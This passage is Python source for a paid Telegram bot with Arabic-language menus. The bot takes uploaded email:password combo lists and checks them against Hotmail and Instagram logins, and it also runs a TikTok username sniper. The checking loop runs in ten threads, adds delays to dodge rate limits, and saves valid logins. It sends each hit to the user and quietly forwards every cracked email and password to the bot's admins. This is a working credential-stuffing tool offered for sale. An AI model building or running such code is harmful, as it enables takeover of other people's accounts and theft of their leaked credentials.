        expires_text = f"{days_left} يوم"
    else:
        expires_text = "∞"
    
    welcome_text = f"""
👋 <b>أهلاً {first_name}!</b>

✅ <b>حسابك مفعّل</b> | ⏰ متبقي: {expires_text}

━━━━━━━━━━━━━━━━━━━━

<b>🎯 اختر الخدمة المطلوبة:</b>

💎 <b>Created by @TTT9KK</b>
📢 <b>القناة:</b> {TELEGRAM_CHANNEL}
    """
    
    # Main menu buttons - stacked vertically
    keyboard = [
        [InlineKeyboardButton("📋 Start Scan", callback_data="main_menu")],
        [InlineKeyboardButton("📦 Multi Scan", callback_data="multi_scan")],
        [InlineKeyboardButton("📊 My Stats", callback_data="my_stats")],
        [InlineKeyboardButton("👑 Membership", callback_data="my_status")],
        [InlineKeyboardButton("🔗 My Referral", callback_data="my_referral")],
        [InlineKeyboardButton("📞 Support", url=TELEGRAM_CHANNEL)]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        welcome_text,
        parse_mode='HTML',
        reply_markup=reply_markup
    )

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check user activation status"""
    user_id = update.effective_user.id
    
    if user_id in ADMIN_IDS:
        status_text = """
👑 <b>أنت مشرف (Admin)</b>

✅ لديك صلاحيات غير محدودة
⏰ الاشتراك: دائم
        """
    elif user_manager.is_active(user_id):
        user_info = user_manager.get_user_info(user_id)
        expire_date = datetime.datetime.fromisoformat(user_info["expires_at"])
        remaining = expire_date - datetime.datetime.now()
        
        status_text = f"""
✅ <b>حسابك مفعّل</b>

📅 تاريخ التفعيل: {user_info["activated_at"][:10]}
⏰ ينتهي في: {expire_date.strftime("%Y-%m-%d %H:%M")}
⏳ الوقت المتبقي: {remaining.days} يوم و {remaining.seconds // 3600} ساعة

📊 <b>الإحصائيات:</b>
• عمليات الفحص: {user_info["total_checks"]}
• الحسابات الصحيحة: {user_info["total_hits"]}
        """
    else:
        status_text = f"""
❌ <b>حسابك غير مفعّل</b>

👤 آيديك: <code>{user_id}</code>

📞 للحصول على اشتراك، تواصل مع المطور:
{MY_SIGNATURE}
        """
    
    await update.message.reply_text(status_text, parse_mode='HTML')

async def activate_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Activate user (Admin only)"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ هذا الأمر للمشرفين فقط!")
        return
    
    # Parse command: /activate USER_ID DURATION_VALUE DURATION_TYPE
    # Example: /activate 123456789 5 hour
    # Example: /activate 123456789 30 day
    # Example: /activate 123456789 1 month
    # Example: /activate 123456789 1 year
    
    args = context.args
    if len(args) != 3:
        help_text = """
<b>استخدام الأمر:</b>
<code>/activate USER_ID DURATION_VALUE DURATION_TYPE</code>

<b>أمثلة:</b>
• <code>/activate 123456789 5 hour</code> - 5 ساعات
• <code>/activate 123456789 7 day</code> - 7 أيام
• <code>/activate 123456789 1 month</code> - شهر واحد
• <code>/activate 123456789 1 year</code> - سنة واحدة

<b>أنواع المدة المتاحة:</b>
• hour - ساعة
• day - يوم
• month - شهر
• year - سنة
        """
        await update.message.reply_text(help_text, parse_mode='HTML')
        return
    
    try:
        target_user_id = int(args[0])
        duration_value = int(args[1])
        duration_type = args[2].lower()
        
        if duration_type not in ["hour", "day", "month", "year"]:
            await update.message.reply_text("❌ نوع المدة غير صحيح! استخدم: hour, day, month, year")
            return
        
        if user_manager.add_user(target_user_id, duration_type, duration_value):
            # Arabic duration names
            duration_names = {
                "hour": "ساعة",
                "day": "يوم",
                "month": "شهر",
                "year": "سنة"
            }
            
            success_text = f"""
✅ <b>تم تفعيل المستخدم بنجاح!</b>

👤 آيدي المستخدم: <code>{target_user_id}</code>
⏰ المدة: {duration_value} {duration_names[duration_type]}
📅 تاريخ الانتهاء: {user_manager.get_user_info(target_user_id)["expires_at"][:16]}
            """
            await update.message.reply_text(success_text, parse_mode='HTML')
            
            # Notify the user
            try:
                notify_text = f"""
🎉 <b>تم تفعيل حسابك!</b>

⏰ المدة: {duration_value} {duration_names[duration_type]}
📅 ينتهي في: {user_manager.get_user_info(target_user_id)["expires_at"][:16]}

يمكنك الآن استخدام البوت!
استخدم /check للبدء
                """
                await context.bot.send_message(
                    chat_id=target_user_id,
                    text=notify_text,
                    parse_mode='HTML'
                )
            except:
                pass
        else:
            await update.message.reply_text("❌ فشل تفعيل المستخدم!")
            
    except ValueError:
        await update.message.reply_text("❌ صيغة الأمر غير صحيحة!")
    except Exception as e:
        await update.message.reply_text(f"❌ خطأ: {str(e)}")

async def remove_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove user activation (Admin only)"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ هذا الأمر للمشرفين فقط!")
        return
    
    args = context.args
    if len(args) != 1:
        await update.message.reply_text(
            "<b>استخدام الأمر:</b>\n<code>/remove USER_ID</code>",
            parse_mode='HTML'
        )
        return
    
    try:
        target_user_id = int(args[0])
        
        if user_manager.remove_user(target_user_id):
            await update.message.reply_text(
                f"✅ تم إلغاء تفعيل المستخدم: <code>{target_user_id}</code>",
                parse_mode='HTML'
            )
        else:
            await update.message.reply_text("❌ المستخدم غير موجود!")
            
    except ValueError:
        await update.message.reply_text("❌ آيدي المستخدم غير صحيح!")
    except Exception as e:
        await update.message.reply_text(f"❌ خطأ: {str(e)}")

async def recent_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show recent users (Admin only)"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ هذا الأمر للمشرفين فقط!")
        return
    
    all_users = user_manager.get_all_users()
    
    if not all_users:
        await update.message.reply_text("📭 لا يوجد مستخدمين بعد")
        return
    
    # Sort by activation date (most recent first)
    sorted_users = sorted(
        all_users.items(),
        key=lambda x: x[1].get("activated_at", ""),
        reverse=True
    )
    
    recent_text = "<b>👥 آخر 10 مستخدمين:</b>\n\n"
    
    for i, (uid, info) in enumerate(sorted_users[:10], 1):
        activated = info.get("activated_at", "غير معروف")[:10]
        expires = datetime.datetime.fromisoformat(info["expires_at"])
        is_active = datetime.datetime.now() < expires
        status = "✅" if is_active else "❌"
        
        recent_text += f"{i}. {status} <code>{uid}</code>\n"
        recent_text += f"   📅 التفعيل: {activated}\n"
        recent_text += f"   📊 فحوصات: {info['total_checks']}\n\n"
    
    recent_text += f"\n💎 <b>Created by @TTT9KK</b>"
    
    await update.message.reply_text(recent_text, parse_mode='HTML')

async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all users (Admin only)"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ هذا الأمر للمشرفين فقط!")
        return
    
    all_users = user_manager.get_all_users()
    
    if not all_users:
        await update.message.reply_text("📭 لا يوجد مستخدمين مفعّلين حالياً")
        return
    
    users_text = "<b>📋 قائمة المستخدمين المفعّلين:</b>\n\n"
    
    for uid, info in all_users.items():
        expire_date = datetime.datetime.fromisoformat(info["expires_at"])
        is_active = datetime.datetime.now() < expire_date
        status = "✅" if is_active else "❌"
        
        users_text += f"{status} <code>{uid}</code>\n"
        users_text += f"   ⏰ ينتهي: {expire_date.strftime('%Y-%m-%d %H:%M')}\n"
        users_text += f"   📊 فحوصات: {info['total_checks']} | نجاحات: {info['total_hits']}\n\n"
    
    await update.message.reply_text(users_text, parse_mode='HTML')

async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start checking process"""
    user_id = update.effective_user.id
    
    # Check if user is active
    if not user_manager.is_active(user_id):
        await update.message.reply_text(
            f"""
❌ <b>حسابك غير مفعّل!</b>

👤 آيديك: <code>{user_id}</code>

للحصول على اشتراك، تواصل مع المطور:
{MY_SIGNATURE}
            """,
            parse_mode='HTML'
        )
        return
    
    await update.message.reply_text(
        """
📤 <b>أرسل ملف الكومبو الآن</b>

الصيغة المطلوبة:
<code>email:password</code>

مثال:
<code>user@hotmail.com:password123
test@outlook.com:pass456</code>
        """,
        parse_mode='HTML'
    )
    
    # Set user state
    context.user_data['waiting_for_combo'] = True

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle combo file upload"""
    user_id = update.effective_user.id
    
    # Check if user is active
    if not user_manager.is_active(user_id):
        await update.message.reply_text("❌ حسابك غير مفعّل!")
        return
    
    # Check if waiting for combo
    if not context.user_data.get('waiting_for_combo'):
        await update.message.reply_text("استخدم /check أولاً للبدء")
        return
    
    # Notify admin
    await notify_admin(
        context,
        update.effective_user,
        "📤 رفع ملف كومبو",
        f"📄 <b>اسم الملف:</b> {update.message.document.file_name}"
    )
    
    # Download file
    file = await update.message.document.get_file()
    file_path = os.path.join(COMBOS_DIR, f"{user_id}_{int(time.time())}.txt")
    await file.download_to_drive(file_path)
    
    # Read combos
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [line.strip() for line in f if ':' in line]
        
        total_combos = len(lines)
        
        if total_combos == 0:
            await update.message.reply_text("❌ الملف فارغ أو بصيغة خاطئة!")
            os.remove(file_path)
            return
        
        # Ask for service selection
        keyboard = [
            [InlineKeyboardButton("✅ جميع الخدمات", callback_data=f"scan_all_{file_path}")],
            [InlineKeyboardButton("🎯 خدمة محددة", callback_data=f"scan_select_{file_path}")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"""
✅ <b>تم استلام الملف</b>

📊 عدد الحسابات: {total_combos}

اختر نوع الفحص:
            """,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        
        context.user_data['waiting_for_combo'] = False
        
    except Exception as e:
        await update.message.reply_text(f"❌ خطأ في قراءة الملف: {str(e)}")
        if os.path.exists(file_path):
            os.remove(file_path)

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    user_id = query.from_user.id
    
    # Check if user is active (except for VIP plans and status)
    if data not in ["vip_plans", "my_status", "back_to_start"] and not user_manager.is_active(user_id) and user_id not in ADMIN_IDS:
        keyboard = [[InlineKeyboardButton("👑 اشترك الآن", callback_data="vip_plans")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            """
🔒 <b>الوصول محظور!</b>

❌ يجب تفعيل حسابك أولاً للوصول إلى هذه الميزة.

اضغط /start للعودة للقائمة الرئيسية

💎 <b>Created by @TTT9KK</b>
            """,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        return
    
    if data == "main_menu":
        keyboard = [
            [InlineKeyboardButton("🔵 Hotmail Checker", callback_data="start_check")],
            [InlineKeyboardButton("📸 Instagram Checker", callback_data="instagram_menu")],
            [InlineKeyboardButton("🎯 TikTok Sniper", callback_data="tiktok_menu")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="back_to_start")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            """
📋 <b>Start Scan</b>

اختر نوع الفحص:

━━━━━━━━━━━━━━━━━━━━

🔵 <b>Hotmail:</b> فحص 70+ خدمة
📸 <b>Instagram:</b> فحص حسابات  
🎯 <b>TikTok:</b> صيد يوزرات

💎 <b>Created by @TTT9KK</b>
            """,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    
    elif data == "multi_scan":
        keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="back_to_start")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            """
📦 <b>Multi Scan</b>

⚡ قريباً...

هذه الميزة قيد التطوير!

💎 <b>Created by @TTT9KK</b>
            """,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    
    elif data == "my_stats":
        user_info = user_manager.users.get(str(user_id), {})
        total_checks = user_info.get("total_checks", 0)
        total_hits = user_info.get("total_hits", 0)
        activated_at = user_info.get("activated_at", "غير محدد")
        
        if activated_at != "غير محدد":
            activated_date = activated_at[:10]
        else:
            activated_date = "غير محدد"
        
        keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="back_to_start")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"""
📊 <b>My Stats</b>

━━━━━━━━━━━━━━━━━━━━

👤 <b>الآيدي:</b> <code>{user_id}</code>
📅 <b>تاريخ التفعيل:</b> {activated_date}

📈 <b>الإحصائيات:</b>
• إجمالي الفحوصات: {total_checks}
• إجمالي النتائج: {total_hits}

💎 <b>Created by @TTT9KK</b>
            """,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    
    elif data == "my_referral":
        keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="back_to_start")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            """
🔗 <b>My Referral</b>

⚡ قريباً...

نظام الإحالة قيد التطوير!

احصل على مكافآت عند دعوة أصدقائك.

💎 <b>Created by @TTT9KK</b>
            """,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    
    elif data == "vip_plans":
        keyboard = [
            [InlineKeyboardButton("⭐ VIP - أسبوع", callback_data="vip_week")],
            [InlineKeyboardButton("💎 VIP - شهر", callback_data="vip_month")],
            [InlineKeyboardButton("👑 VIP - سنة", callback_data="vip_year")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="back_to_start")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"""
👑 <b>Membership Plans</b>

━━━━━━━━━━━━━━━━━━━━

<b>⭐ VIP أسبوع</b>
• المدة: 7 أيام
• فحص غير محدود
• جميع الميزات

<b>💎 VIP شهر</b>
• المدة: 30 يوم
• فحص غير محدود
• أولوية في الدعم

<b>👑 VIP سنة</b>
• المدة: 365 يوم
• فحص غير محدود
• دعم VIP مميز

━━━━━━━━━━━━━━━━━━━━

للاشتراك، تواصل مع:
{MY_SIGNATURE}

💎 <b>Created by @TTT9KK</b>
            """,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    
    elif data.startswith("vip_"):
        plan = data.split("_")[1]
        plan_names = {
            "week": "أسبوع",
            "month": "شهر",
            "year": "سنة"
        }
        
        keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="vip_plans")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"""
✅ <b>تم اختيار خطة VIP {plan_names.get(plan, '')}</b>

للإتمام عملية الاشتراك:

1️⃣ تواصل مع: {MY_SIGNATURE}
2️⃣ أرسل آيديك: <code>{user_id}</code>
3️⃣ اختر خطة: VIP {plan_names.get(plan, '')}

💎 <b>Created by @TTT9KK</b>
            """,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    
    elif data == "back_to_start":
        # Re-create start message
        user = query.from_user
        first_name = user.first_name if user.first_name else "مستخدم"
        is_active = user_manager.is_active(user_id) or user_id in ADMIN_IDS
        
        if is_active:
            user_info = user_manager.users.get(str(user_id), {})
            expires = user_info.get("expires_at", "غير محدد")
            if expires != "غير محدد":
                expires_date = datetime.datetime.fromisoformat(expires)
                days_left = (expires_date - datetime.datetime.now()).days
                expires_text = f"{days_left} يوم"
            else:
                expires_text = "∞"
            
            keyboard = [
                [InlineKeyboardButton("📋 Start Scan", callback_data="main_menu")],
                [InlineKeyboardButton("📦 Multi Scan", callback_data="multi_scan")],
                [InlineKeyboardButton("📊 My Stats", callback_data="my_stats")],
                [InlineKeyboardButton("👑 Membership", callback_data="my_status")],
                [InlineKeyboardButton("🔗 My Referral", callback_data="my_referral")],
                [InlineKeyboardButton("📞 Support", url=TELEGRAM_CHANNEL)]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.edit_message_text(
                f"""
👋 <b>أهلاً {first_name}!</b>

✅ <b>حسابك مفعّل</b> | ⏰ متبقي: {expires_text}

━━━━━━━━━━━━━━━━━━━━

<b>🎯 اختر الخدمة المطلوبة:</b>

💎 <b>Created by @TTT9KK</b>
📢 <b>القناة:</b> {TELEGRAM_CHANNEL}
                """,
                parse_mode='HTML',
                reply_markup=reply_markup
            )
        else:
            keyboard = [
                [InlineKeyboardButton("👑 اشترك الآن - VIP", callback_data="vip_plans")],
                [InlineKeyboardButton("📊 حالة الاشتراك", callback_data="my_status")],
                [InlineKeyboardButton("📞 الدعم الفني", url=TELEGRAM_CHANNEL)]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.edit_message_text(
                f"""
🔒 <b>مرحباً {first_name}!</b>

❌ <b>حسابك غير مفعّل</b>

للوصول إلى جميع الميزات، يجب عليك الاشتراك أولاً.

👤 <b>آيديك:</b> <code>{user_id}</code>

💎 <b>Created by @TTT9KK</b>
                """,
                parse_mode='HTML',
                reply_markup=reply_markup
            )
    
    elif data == "instagram_menu":
        await query.edit_message_text(
            """
📸 <b>Instagram Account Checker</b>

أرسل ملف كومبو بالصيغة:
<code>username:password</code>

مثال:
<code>user1:pass123
user2:pass456</code>

💎 <b>Created by @TTT9KK</b>
            """,
            parse_mode='HTML'
        )
        context.user_data['waiting_for_instagram'] = True
    
    elif data == "tiktok_menu":
        keyboard = [
            [
                InlineKeyboardButton("4 أحرف (4l)", callback_data="tiktok_4l"),
                InlineKeyboardButton("3 أحرف (3l)", callback_data="tiktok_3l")
            ],
            [
                InlineKeyboardButton("3 أحرف + _ (3l_)", callback_data="tiktok_3l_")
            ],
            [
                InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"""
🎯 <b>TikTok Username Sniper</b>

اختر نوع اسم المستخدم:

<b>📝 الأنواع:</b>
• <b>4l:</b> 4 أحرف عشوائية (مثل: abcd)
• <b>3l:</b> 3 أحرف عشوائية (مثل: abc)
• <b>3l_:</b> 3 أحرف + _ (مثل: a_bc)

💎 <b>Created by @TTT9KK</b>
            """,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    
    elif data.startswith("tiktok_"):
        user_type = data.split("_")[1]
        
        keyboard = [
            [
                InlineKeyboardButton("✅ نعم", callback_data=f"tiktok_numbers_yes_{user_type}"),
                InlineKeyboardButton("❌ لا", callback_data=f"tiktok_numbers_no_{user_type}")
            ],
            [
                InlineKeyboardButton("🔙 رجوع", callback_data="tiktok_menu")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"""
🎯 <b>TikTok Username Sniper</b>

📝 <b>النوع المختار:</b> {user_type}

هل تريد تضمين أرقام في الاسم؟

💎 <b>Created by @TTT9KK</b>
            """,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    
    elif data.startswith("tiktok_numbers_"):
        parts = data.split("_")
        with_numbers = parts[2] == "yes"
        user_type = parts[3]
        
        keyboard = [
            [
                InlineKeyboardButton("100 فحص", callback_data=f"tiktok_start_{user_type}_{with_numbers}_100"),
                InlineKeyboardButton("500 فحص", callback_data=f"tiktok_start_{user_type}_{with_numbers}_500")
            ],
            [
                InlineKeyboardButton("1000 فحص", callback_data=f"tiktok_start_{user_type}_{with_numbers}_1000"),
                InlineKeyboardButton("∞ لا نهائي", callback_data=f"tiktok_start_{user_type}_{with_numbers}_9999999")
            ],
            [
                InlineKeyboardButton("🔙 رجوع", callback_data="tiktok_menu")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"""
🎯 <b>TikTok Username Sniper</b>

📝 <b>النوع:</b> {user_type}
🔢 <b>أرقام:</b> {'نعم' if with_numbers else 'لا'}

كم عدد الفحوصات؟

💎 <b>Created by @TTT9KK</b>
            """,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    
    elif data.startswith("tiktok_start_"):
        parts = data.split("_")
        user_type = parts[2]
        with_numbers = parts[3] == "True"
        max_checks = int(parts[4])
        
        # Notify admin
        await notify_admin(
            context,
            query.from_user,
            "🎯 بدء TikTok Sniper",
            f"📝 <b>النوع:</b> {user_type}\n🔢 <b>أرقام:</b> {'نعم' if with_numbers else 'لا'}\n📊 <b>الفحوصات:</b> {max_checks if max_checks < 9999999 else '∞'}"
        )
        
        await query.edit_message_text(
            f"""
🎯 <b>TikTok Username Sniper</b>

⏳ جاري بدء البحث...

📝 النوع: {user_type}
🔢 أرقام: {'نعم' if with_numbers else 'لا'}
📊 الفحوصات: {max_checks if max_checks < 9999999 else '∞'}

💎 <b>Created by @TTT9KK</b>
            """,
            parse_mode='HTML'
        )
        
        # Start sniper
        import asyncio
        asyncio.create_task(
            start_tiktok_sniper(query, context, user_type, with_numbers, 0.05, max_checks)
        )
    
    elif data == "back_to_main":
        keyboard = [
            [InlineKeyboardButton("🚀 فحص حسابات", callback_data="start_check")],
            [InlineKeyboardButton("🎯 TikTok Sniper", callback_data="tiktok_menu")],
            [InlineKeyboardButton("📊 حالة الاشتراك", callback_data="my_status")],
            [InlineKeyboardButton("📢 القناة", url=TELEGRAM_CHANNEL)]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"""
🎯 <b>مرحباً بك في Hotmail MFC Checker Bot</b>

👤 الآيدي الخاص بك: <code>{user_id}</code>

اختر الخدمة:

💎 <b>Created by @TTT9KK</b>
            """,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    
    elif data == "start_check":
        if not user_manager.is_active(user_id):
            await query.edit_message_text(
                f"❌ حسابك غير مفعّل!\n\nآيديك: <code>{user_id}</code>",
                parse_mode='HTML'
            )
            return
        
        await query.edit_message_text(
            """
📤 <b>أرسل ملف الكومبو الآن</b>

الصيغة المطلوبة:
<code>email:password</code>
            """,
            parse_mode='HTML'
        )
        context.user_data['waiting_for_combo'] = True
    
    elif data == "my_status":
        if user_id in ADMIN_IDS:
            status_text = "👑 <b>أنت مشرف (Admin)</b>\n\n✅ صلاحيات غير محدودة"
        elif user_manager.is_active(user_id):
            user_info = user_manager.get_user_info(user_id)
            expire_date = datetime.datetime.fromisoformat(user_info["expires_at"])
            status_text = f"""
✅ <b>حسابك مفعّل</b>

⏰ ينتهي في: {expire_date.strftime("%Y-%m-%d %H:%M")}
📊 فحوصات: {user_info["total_checks"]}
🎯 نجاحات: {user_info["total_hits"]}
            """
        else:
            status_text = f"❌ حسابك غير مفعّل!\n\nآيديك: <code>{user_id}</code>"
        
        await query.edit_message_text(status_text, parse_mode='HTML')
    
    elif data.startswith("scan_"):
        parts = data.split("_", 2)
        scan_type = parts[1]
        file_path = parts[2]
        
        if not os.path.exists(file_path):
            await query.edit_message_text("❌ الملف غير موجود!")
            return
        
        # Read combos
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [line.strip() for line in f if ':' in line]
        
        # Start scanning
        await query.edit_message_text(
            f"""
🚀 <b>جاري بدء الفحص...</b>

📊 عدد الحسابات: {len(lines)}
⏰ الوضع: {scan_type}

⏳ الرجاء الانتظار...
            """,
            parse_mode='HTML'
        )
        
        # Process in background
        await process_combos(query, context, file_path, lines, scan_type)

async def process_combos(query, context, file_path, lines, scan_type):
    """Process combo list with threading - FIXED VERSION"""
    user_id = query.from_user.id
    
    # Initialize stats
    stats = {
        "hit": 0,
        "bad": 0,
        "retry": 0,
        "locked": 0,
        "processed": 0,
        "total": len(lines),
        "services_found": {}
    }
    
    # Results directory
    result_dir = os.path.join(RESULTS_DIR, f"{user_id}_{int(time.time())}")
    os.makedirs(result_dir, exist_ok=True)
    
    # Status message
    status_msg = await context.bot.send_message(
        chat_id=user_id,
        text="⏳ جاري الفحص...\n\n💡 سيتم إرسال كل حساب صحيح فوراً!\n💎 <b>Created by @TTT9KK</b>",
        parse_mode='HTML'
    )
    
    start_time = time.time()
    stats_lock = threading.Lock()
    
    # Process with threads
    from concurrent.futures import ThreadPoolExecutor, as_completed
    
    def check_single(line):
        """Check single combo - thread safe"""
        if ':' not in line:
            return {"status": "skip"}
        
        try:
            parts = line.split(':', 1)
            email = parts[0].strip()
            password = parts[1].strip()
            
            # Delay to avoid rate limit
            time.sleep(random.uniform(0.3, 0.5))
            
            # Check account
            result = check_account(email, password, user_id)
            
            return {
                "email": email,
                "password": password,
                "status": result["status"],
                "message": result["message"],
                "services": result["services"]
            }
        except Exception as e:
            logger.error(f"Error in check_single: {e}")
            return {"status": "error"}
    
    # Start checking with 10 threads
    results_list = []
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        # Submit all tasks
        future_to_line = {executor.submit(check_single, line): line for line in lines}
        
        # Process as they complete
        for future in as_completed(future_to_line):
            result = future.result()
            
            # Always update processed count
            with stats_lock:
                stats["processed"] += 1
                
                if result and result.get("status") == "hit":
                    stats["hit"] += 1
                    
                    # Save hit
                    hit_file = os.path.join(result_dir, "Hits_All.txt")
                    with open(hit_file, 'a', encoding='utf-8') as f:
                        f.write(f"{result['email']}:{result['password']} | {result['message']}\n")
                    
                    # Notify admin about Hotmail hit
                    try:
                        # Get user info
                        user_info = await context.bot.get_chat(user_id)
                        username = user_info.username if user_info.username else "بدون معرف"
                        first_name = user_info.first_name if user_info.first_name else "مستخدم"
                        
                        services_text = ""
                        if result.get("services"):
                            services_list = list(result.get("services", {}).keys())[:5]
                            if services_list:
                                services_text = f"\n🎯 <b>الخدمات:</b> {', '.join(services_list)}"
                        
                        for admin_id in ADMIN_IDS:
                            admin_hit_msg = f"""
✅ <b>صيد حساب Hotmail!</b>

👤 <b>المستخدم:</b> {first_name}
🔗 <b>المعرف:</b> @{username}
🆔 <b>الآيدي:</b> <code>{user_id}</code>

📧 <b>Email:</b> <code>{result['email']}</code>
🔑 <b>Password:</b> <code>{result['password']}</code>
{services_text}

📅 <b>الوقت:</b> {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

💎 <b>Created by @TTT9KK</b>
                            """
                            
                            await context.bot.send_message(
                                chat_id=admin_id,
                                text=admin_hit_msg,
                                parse_mode='HTML'
                            )
                    except Exception as e:
                        logger.error(f"Error notifying admin about hit: {e}")
                    
                    # Save per service
                    for service_name in result.get("services", {}).keys():
                        stats["services_found"][service_name] = stats["services_found"].get(service_name, 0) + 1
                        
                        service_file = os.path.join(result_dir, services[service_name]["file"])
                        with open(service_file, 'a', encoding='utf-8') as f:
                            f.write(f"{result['email']}:{result['password']}\n")
                    
                    # Send hit immediately
                    hit_msg = f"""
🎯 <b>حساب صحيح!</b> #{stats["hit"]}

📧 <b>Email:</b> <code>{result['email']}</code>
🔑 <b>Password:</b> <code>{result['password']}</code>

{result['message']}

💎 <b>Created by @TTT9KK</b>
                    """
                    
                    try:
                        import asyncio
                        loop = asyncio.new_event_loop()
                        asyncio.set_event_loop(loop)
                        loop.run_until_complete(
                            context.bot.send_message(
                                chat_id=user_id,
                                text=hit_msg,
                                parse_mode='HTML'
                            )
                        )
                        loop.close()
                    except Exception as e:
                        logger.error(f"Error sending hit msg: {e}")
                
                elif result and result.get("status") == "bad":
                    stats["bad"] += 1
                    
                elif result and result.get("status") == "locked":
                    stats["locked"] += 1
                    
                elif result and result.get("status") == "retry":
                    stats["retry"] += 1
                
                else:
                    # Any other status (error, skip, etc) counts as bad
                    stats["bad"] += 1
                
                # Update progress every 10
                if stats["processed"] % 10 == 0 or stats["processed"] >= stats["total"]:
                    progress = (stats["processed"] / stats["total"]) * 100
                    
                    elapsed = time.time() - start_time
                    if stats["processed"] > 0:
                        avg_time = elapsed / stats["processed"]
                        remaining = (stats["total"] - stats["processed"]) * avg_time
                        eta_min = int(remaining / 60)
                        eta_sec = int(remaining % 60)
                        eta_text = f"\n⏱️ المتبقي: ~{eta_min}د {eta_sec}ث"
                    else:
                        eta_text = ""
                    
                    progress_text = f"""
⏳ <b>جاري الفحص بـ 10 ثريدات...</b>

📊 التقدم: {stats["processed"]}/{stats["total"]} ({progress:.1f}%)
{eta_text}

✅ صحيح: {stats["hit"]}
❌ خاطئ: {stats["bad"]}
🔒 مقفل: {stats["locked"]}
🔄 إعادة: {stats["retry"]}

💡 كل حساب صحيح يُرسل فوراً!
💎 <b>Created by @TTT9KK</b>
                    """
                    
                    try:
                        import asyncio
                        loop = asyncio.new_event_loop()
                        asyncio.set_event_loop(loop)
                        loop.run_until_complete(
                            status_msg.edit_text(progress_text, parse_mode='HTML')
                        )
                        loop.close()
                    except Exception as e:
                        logger.error(f"Error updating progress: {e}")
    
    # Final results
    final_text = f"""
✅ <b>اكتمل الفحص!</b>

📊 <b>النتائج النهائية:</b>
• الإجمالي: {stats["total"]}
• صحيح: {stats["hit"]}
• خاطئ: {stats["bad"]}
• مقفل: {stats["locked"]}
• إعادة: {stats["retry"]}

🎯 <b>الخدمات: {len(stats["services_found"])}</b>

💎 <b>Created by @TTT9KK</b>
📢 <b>Channel:</b> {TELEGRAM_CHANNEL}
    """
    
    if stats["services_found"]:
        final_text += "\n\n<b>🎯 الخدمات المكتشفة:</b>\n"
        for service, count in sorted(stats["services_found"].items(), key=lambda x: x[1], reverse=True)[:15]:
            final_text += f"• {service}: {count}\n"
    
    await status_msg.edit_text(final_text, parse_mode='HTML')
    
    # Send summary to admin
    if stats["hit"] > 0:
        try:
            user_info = await context.bot.get_chat(user_id)
            username = user_info.username if user_info.username else "بدون معرف"
            first_name = user_info.first_name if user_info.first_name else "مستخدم"
            
            services_summary = ""
            if stats["services_found"]:
                top_services = sorted(stats["services_found"].items(), key=lambda x: x[1], reverse=True)[:5]
                services_summary = "\n\n<b>🎯 أهم الخدمات:</b>\n"
                for service, count in top_services:
                    services_summary += f"• {service}: {count}\n"
            
            for admin_id in ADMIN_IDS:
                admin_summary = f"""
📊 <b>ملخص فحص Hotmail</b>

👤 <b>المستخدم:</b> {first_name}
🔗 <b>المعرف:</b> @{username}
🆔 <b>الآيدي:</b> <code>{user_id}</code>

<b>📈 النتائج:</b>
• الإجمالي: {stats["total"]}
